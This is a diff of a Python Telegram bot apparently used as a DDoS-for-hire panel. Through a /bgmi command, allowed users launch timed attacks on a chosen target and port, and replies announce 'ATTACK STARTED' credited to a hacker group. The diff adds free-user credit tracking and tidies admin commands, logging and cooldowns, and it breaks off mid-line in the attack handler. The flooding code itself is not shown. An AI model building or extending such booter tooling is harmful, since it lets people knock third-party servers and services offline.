@@ -16,11 +16,11 @@ admin_id = ["1375408229"]
 # File to store allowed user IDs
 USER_FILE = "users.txt"
 
+# File to store free user IDs
+FREE_USER_FILE = "free_users.txt"
+
 # File to store command logs
 LOG_FILE = "log.txt"
-
-# Global flag to control bot running state
-is_running = True
 
 # Function to read user IDs from the file
 def read_users():
@@ -29,6 +29,24 @@ def read_users():
             return file.read().splitlines()
     except FileNotFoundError:
         return []
+
+# Function to read free user IDs and their credits from the file
+def read_free_users():
+    free_user_credits = {}
+    try:
+        with open(FREE_USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, credits = user_info
+                        free_user_credits[user_id] = int(credits)
+                    else:
+                        print(f"Ignoring invalid line in free user file: {line}")
+    except FileNotFoundError:
+        pass
+    return free_user_credits
 
 # List to store allowed user IDs
 allowed_user_ids = read_users()
@@ -40,7 +58,7 @@ def log_command(user_id, target, port, time):
         username = "@" + user_info.username
     else:
         username = f"UserID: {user_id}"
-    
+
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
@@ -66,14 +84,12 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
         log_entry += f" | Port: {port}"
     if time:
         log_entry += f" | Time: {time}"
-    
+
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     if user_id in admin_id:
         command = message.text.split()
@@ -83,20 +99,18 @@ def add_user(message):
                 allowed_user_ids.append(user_to_add)
                 with open(USER_FILE, "a") as file:
                     file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} Added Successfully."
+                response = f"User {user_to_add} added successfully."
             else:
                 response = "User already exists."
         else:
             response = "Please specify a user ID to add."
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only admin can run this command."
 
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     if user_id in admin_id:
         command = message.text.split()
@@ -111,17 +125,15 @@ def remove_user(message):
             else:
                 response = f"User {user_to_remove} not found in the list."
         else:
-            response = '''Please Specify A User ID to Remove. 
- Usage: /remove <userid>'''
+            response = '''Please specify a user ID to remove. 
+Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only admin can run this command."
 
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     if user_id in admin_id:
         try:
@@ -131,17 +143,15 @@ def clear_logs_command(message):
                     response = "Logs are already cleared. No data found."
                 else:
                     file.truncate(0)
-                    response = "Logs Cleared Successfully"
+                    response = "Logs cleared successfully."
         except FileNotFoundError:
             response = "Logs are already cleared."
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only admin can run this command."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     if user_id in admin_id:
         try:
@@ -157,17 +167,15 @@ def show_all_users(message):
                         except Exception as e:
                             response += f"- User ID: {user_id}\n"
                 else:
-                    response = "No data found"
+                    response = "No data found."
         except FileNotFoundError:
-            response = "No data found"
+            response = "No data found."
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only admin can run this command."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     if user_id in admin_id:
         if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
@@ -178,16 +186,14 @@ def show_recent_logs(message):
                 response = "No data found."
                 bot.reply_to(message, response)
         else:
-            response = "No data found"
+            response = "No data found."
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only admin can run this command."
         bot.reply_to(message, response)
 
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     response = f"Your ID: {user_id}"
     bot.reply_to(message, response)
@@ -196,7 +202,7 @@ def show_user_id(message):
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    
+
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy Indian Watchdogs @Indian_Hackers_Team"
     bot.reply_to(message, response)
 
@@ -208,28 +214,17 @@ COOLDOWN_TIME = 0
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
-    if not is_running:
-        return
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+                response = "You are on cooldown. Please wait 5 minutes before running the /bgmi command again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
-        
+
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
-            if time > 5000:
-                response = "Error: Time interval must be less than 80."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port)
+        if len(command) == 4:  # Updated to accept target, time, and
